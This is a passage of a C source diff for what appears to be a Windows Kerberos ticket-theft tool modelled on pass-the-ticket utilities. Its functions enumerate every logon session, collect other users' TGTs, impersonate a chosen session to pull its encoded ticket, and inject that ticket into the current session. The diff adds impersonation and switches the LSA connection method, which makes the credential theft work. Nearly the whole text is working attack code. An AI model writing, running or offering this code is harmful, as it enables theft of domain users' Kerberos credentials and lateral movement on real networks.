     ULONG reqSize = (ULONG)(sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(targetSrv) * sizeof(WCHAR)));
     PKERB_RETRIEVE_TKT_REQUEST retReq = (PKERB_RETRIEVE_TKT_REQUEST)malloc(reqSize);
 
     if (!retReq) {
         PrintError("Memory allocation failed");
         fre_fn(cacheRsp);
+        if (needRevert) {
+            RevertToSelf();
+            CloseHandle(hImpToken);
+        }
         LsaDeregisterLogonProcess(lsa);
         fre_fn(session_list);
         FreeLibrary(h);
@@ -864,7 +920,8 @@ void ExportTicket(const char* logonIdStr) {
 
     ZeroMemory(retReq, reqSize);
     retReq->MessageType = KerbRetrieveEncodedTicketMessage;
-    retReq->LogonId = targetLuid;
+    retReq->LogonId.LowPart = 0;
+    retReq->LogonId.HighPart = 0;
     retReq->TicketFlags = 0;
     retReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
     retReq->EncryptionType = 0;
@@ -882,6 +939,10 @@ void ExportTicket(const char* logonIdStr) {
             (unsigned long)0, (unsigned long)sub);
         free(retReq);
         fre_fn(cacheRsp);
+        if (needRevert) {
+            RevertToSelf();
+            CloseHandle(hImpToken);
+        }
         LsaDeregisterLogonProcess(lsa);
         fre_fn(session_list);
         FreeLibrary(h);
@@ -890,7 +951,11 @@ void ExportTicket(const char* logonIdStr) {
 
     free(retReq);
 
-    // Generate filename: 0xLOGONID_Username.kirbi
+    if (needRevert) {
+        RevertToSelf();
+        CloseHandle(hImpToken);
+    }
+
     char filename[1024];
     wchar_t cleanUserName[256] = { 0 };
 
@@ -901,7 +966,6 @@ void ExportTicket(const char* logonIdStr) {
         wcscpy(cleanUserName, L"unknown");
     }
 
-    // Clean username for filename
     for (size_t i = 0; i < wcslen(cleanUserName); i++) {
         if (cleanUserName[i] == L'/' || cleanUserName[i] == L'\\' || cleanUserName[i] == L':' ||
             cleanUserName[i] == L'*' || cleanUserName[i] == L'?' || cleanUserName[i] == L'"' ||
@@ -942,13 +1006,12 @@ void ExportTicket(const char* logonIdStr) {
     FreeLibrary(h);
 }
 
+
 void AutoExportAndImport() {
     PrintDebug("Auto mode: Enumerating tickets and importing selected TGT...");
 
-    // Reset TGT list
     g_tgtCount = 0;
 
-    // Enable privileges
     HANDLE hToken;
     TOKEN_PRIVILEGES tp;
     LUID luid;
@@ -960,20 +1023,13 @@ void AutoExportAndImport() {
             tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
             AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
         }
-
-        if (LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid)) {
-            tp.PrivilegeCount = 1;
-            tp.Privileges[0].Luid = luid;
-            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
-        }
         CloseHandle(hToken);
     }
 
     HMODULE h = LoadLibraryA("secur32.dll");
     PLSA_ENUMERATE_LOGON_SESSIONS enum_fn = (PLSA_ENUMERATE_LOGON_SESSIONS)GetProcAddress(h, "LsaEnumerateLogonSessions");
     PLSA_GET_LOGON_SESSION_DATA get_fn = (PLSA_GET_LOGON_SESSION_DATA)GetProcAddress(h, "LsaGetLogonSessionData");
-    PLSA_REGISTER_LOGON_PROCESS reg_fn = (PLSA_REGISTER_LOGON_PROCESS)GetProcAddress(h, "LsaRegisterLogonProcess");
+    PLSA_CONNECT_UNTRUSTED con_fn = (PLSA_CONNECT_UNTRUSTED)GetProcAddress(h, "LsaConnectUntrusted");
     PLSA_LOOKUP_AUTHENTICATION_PACKAGE lkp_fn = (PLSA_LOOKUP_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaLookupAuthenticationPackage");
     PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn = (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaCallAuthenticationPackage");
     PLSA_FREE_RETURN_BUFFER fre_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");
@@ -988,18 +1044,10 @@ void AutoExportAndImport() {
     }
 
     HANDLE lsa = NULL;
-    LSA_STRING lsaName;
-    char lsaNameStr[] = "KlistClone";
-    lsaName.Buffer = lsaNameStr;
-    lsaName.Length = (USHORT)strlen(lsaNameStr);
-    lsaName.MaximumLength = lsaName.Length + 1;
-    LSA_OPERATIONAL_MODE mode = 0;
-
-    NTSTATUS regStatus = reg_fn(&lsaName, &lsa, &mode);
-    if (regStatus != 0) {
-        PrintError("LsaRegisterLogonProcess failed - need Administrator privileges");
-        FreeLibrary(h);
+    if (con_fn(&lsa) != 0) {
+        PrintError("LsaConnectUntrusted failed");
         fre_fn(session_list);
+        FreeLibrary(h);
         return;
     }
 
@@ -1018,7 +1066,8 @@ void AutoExportAndImport() {
         return;
     }
 
-    // Enumerate and collect TGTs
+    printf("[DEBUG] Scanning %lu sessions for TGTs...\n", (unsigned long)session_cnt);
+
     for (ULONG i = 0; i < session_cnt; i++) {
         PSECURITY_LOGON_SESSION_DATA session_data = NULL;
         if (get_fn(&session_list[i], &session_data) != 0 || !session_data) continue;
@@ -1041,7 +1090,13 @@ void AutoExportAndImport() {
 
         KERB_QUERY_TKT_CACHE_REQUEST req;
         req.MessageType = KerbQueryTicketCacheMessage;
-        req.LogonId = session_list[i];
+        req.LogonId.LowPart = session_list[i].LowPart;
+        req.LogonId.HighPart = session_list[i].HighPart;
+
+        printf("[DEBUG] Checking session 0x%lx (%ls\\%ls)...\n",
+            (unsigned long)session_list[i].LowPart,
+            wcslen(dom) ? dom : L"?",
+            wcslen(usr) ? usr : L"?");
 
         PKERB_QUERY_TKT_CACHE_RESPONSE rsp = NULL;
         ULONG sz = 0;
@@ -1050,6 +1105,8 @@ void AutoExportAndImport() {
         NTSTATUS status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);
 
         if (status == 0 && sub == 0 && rsp && rsp->CountOfTickets > 0) {
+            printf("[DEBUG]   -> Found %lu tickets\n", (unsigned long)rsp->CountOfTickets);
+
             for (ULONG j = 0; j < rsp->CountOfTickets; j++) {
                 KERB_TICKET_CACHE_INFO* t = &rsp->Tickets[j];
                 wchar_t srv[512] = { 0 };
@@ -1062,11 +1119,20 @@ void AutoExportAndImport() {
                 }
 
                 if (wcsstr(srv, L"krbtgt")) {
+                    printf("[DEBUG]   TGT found: %ls\n", srv);
                     AddTGTToList(session_list[i].LowPart, usr, dom, srv);
                 }
             }
             fre_fn(rsp);
         }
+        else if (status != 0 || sub != 0) {
+            printf("[DEBUG]   Query failed (Status: 0x%08lX, SubStatus: 0x%08lX)\n",
+                (unsigned long)status, (unsigned long)sub);
+        }
+        else {
+            printf("[DEBUG]   -> No tickets\n");
+        }
+
         fre_fn(session_data);
     }
 
@@ -1078,7 +1144,6 @@ void AutoExportAndImport() {
         return;
     }
 
-    // Display TGTs
     printf("\n");
     PrintSeparator("AVAILABLE TGTs");
     printf("%-6s %-12s %-30s %-20s %s\n", "Index", "LogonId", "User", "Domain", "Service");
@@ -1093,7 +1158,6 @@ void AutoExportAndImport() {
             g_tgtList[i].serviceName);
     }
 
-    // Ask user to choose
     printf("\nChoose TGT to export and import (1-%lu), or 0 to cancel: ", (unsigned long)g_tgtCount);
 
     char input[10];
@@ -1123,7 +1187,6 @@ void AutoExportAndImport() {
     printf("\n");
     wprintf(L"[*] Selected: #%d - 0x%lx (%ls)\n", choice, targetLogonId, targetUserName);
 
-    // Find the session with this LogonId
     LUID targetLuid = { 0 };
     BOOL sessionFound = FALSE;
 
@@ -1143,16 +1206,21 @@ void AutoExportAndImport() {
         return;
     }
 
-    // Query tickets for this LogonId
+    // Ahora volvemos a consultar para encontrar el TGT específico
     KERB_QUERY_TKT_CACHE_REQUEST cacheReq;
     cacheReq.MessageType = KerbQueryTicketCacheMessage;
-    cacheReq.LogonId = targetLuid;
+    cacheReq.LogonId.LowPart = targetLuid.LowPart;  // CORRECTO: usar el LUID real
+    cacheReq.LogonId.HighPart = targetLuid.HighPart;
+
+    printf("[DEBUG] Re-querying session 0x%lx to find TGT...\n", targetLogonId);
 
     PKERB_QUERY_TKT_CACHE_RESPONSE cacheRsp = NULL;
     ULONG sz = 0;
     NTSTATUS sub = 0;
 
     if (cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub) != 0 || sub != 0) {
+        printf("[DEBUG] Failed to re-query session (Status: 0x%08lX, SubStatus: 0x%08lX)\n",
+            (unsigned long)0, (unsigned long)sub);
         PrintError("Failed to get ticket cache");
         LsaDeregisterLogonProcess(lsa);
         fre_fn(session_list);
@@ -1160,7 +1228,6 @@ void AutoExportAndImport() {
         return;
     }
 
-    // Find the TGT
     BOOL found = FALSE;
     wchar_t targetSrv[512] = { 0 };
 
@@ -1179,6 +1246,7 @@ void AutoExportAndImport() {
             found = TRUE;
             wcsncpy(targetSrv, srv, 511);
             targetSrv[511] = L'\0';
+            printf("[DEBUG] Found TGT: %ls\n", targetSrv);
             break;
         }
     }
@@ -1192,13 +1260,34 @@ void AutoExportAndImport() {
         return;
     }
 
-    // Retrieve the ticket
+    printf("[DEBUG] Impersonating session 0x%lx to retrieve TGT...\n", targetLogonId);
+
+    HANDLE hImpToken = NULL;
+    BOOL needRevert = FALSE;
+
+    if (ImpersonateSession(targetLogonId, &hImpToken)) {
+        if (ImpersonateLoggedOnUser(hImpToken)) {
+            needRevert = TRUE;
+            printf("[DEBUG] Successfully impersonated\n");
+        }
+        else {
+            printf("[DEBUG] ImpersonateLoggedOnUser failed\n");
+        }
+    }
+    else {
+        printf("[DEBUG] ImpersonateSession failed\n");
+    }
+
     ULONG reqSize = (ULONG)(sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(targetSrv) * sizeof(WCHAR)));
     PKERB_RETRIEVE_TKT_REQUEST retReq = (PKERB_RETRIEVE_TKT_REQUEST)malloc(reqSize);
 
     if (!retReq) {
         PrintError("Memory allocation failed");
         fre_fn(cacheRsp);
+        if (needRevert) {
+            RevertToSelf();
+            CloseHandle(hImpToken);
+        }
         LsaDeregisterLogonProcess(lsa);
         fre_fn(session_list);
         FreeLibrary(h);
@@ -1207,7 +1296,8 @@ void AutoExportAndImport() {
 
     ZeroMemory(retReq, reqSize);
     retReq->MessageType = KerbRetrieveEncodedTicketMessage;
-    retReq->LogonId = targetLuid;
+    retReq->LogonId.LowPart = 0;
+    retReq->LogonId.HighPart = 0;
     retReq->TicketFlags = 0;
     retReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
     retReq->EncryptionType = 0;
@@ -1220,10 +1310,19 @@ void AutoExportAndImport() {
     ULONG retSz = 0;
     sub = 0;
 
-    if (cal_fn(lsa, auth, retReq, reqSize, (PVOID*)&retRsp, &retSz, &sub) != 0 || sub != 0) {
+    NTSTATUS retStatus = cal_fn(lsa, auth, retReq, reqSize, (PVOID*)&retRsp, &retSz, &sub);
+
+    free(retReq);
+
+    if (needRevert) {
+        RevertToSelf();
+        CloseHandle(hImpToken);
+        printf("[DEBUG] Reverted impersonation\n");
+    }
+
+    if (retStatus != 0 || sub != 0) {
         printf("Error: Failed to retrieve ticket - Status=0x%08lX, SubStatus=0x%08lX\n",
-            (unsigned long)0, (unsigned long)sub);
-        free(retReq);
+            (unsigned long)retStatus, (unsigned long)sub);
         fre_fn(cacheRsp);
         LsaDeregisterLogonProcess(lsa);
         fre_fn(session_list);
@@ -1231,12 +1330,9 @@ void AutoExportAndImport() {
         return;
     }
 
-    free(retReq);
-
     PrintSuccess("Ticket retrieved successfully");
     printf("    Size: %lu bytes\n", (unsigned long)retRsp->Ticket.EncodedTicketSize);
 
-    // Now import the ticket into current session
     printf("\n[*] Importing ticket into current session...\n");
 
     ULONG submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + retRsp->Ticket.EncodedTicketSize;
@@ -1302,10 +1398,6 @@ void AutoExportAndImport() {
     wprintf(L"    Service: %ls\n", targetSrv);
     printf("\n");
     PrintSuccess("Ticket is now available in your Kerberos cache");
-    // printf("    You can verify with: klist\n");
-    printf("\n");
-    PrintSeparator("CURRENT SESSION TICKETS");
-    EnumerateMyTickets();
 
     if (response) fre_fn(response);
     fre_fn(retRsp);
@@ -1313,6 +1405,10 @@ void AutoExportAndImport() {
     LsaDeregisterLogonProcess(lsa);
     fre_fn(session_list);
     FreeLibrary(h);
+
+    printf("\n");
+    PrintSeparator("CURRENT SESSION TICKETS");
+    EnumerateMyTickets();
 }
 
 void PassTheTicket(const char* filename) {
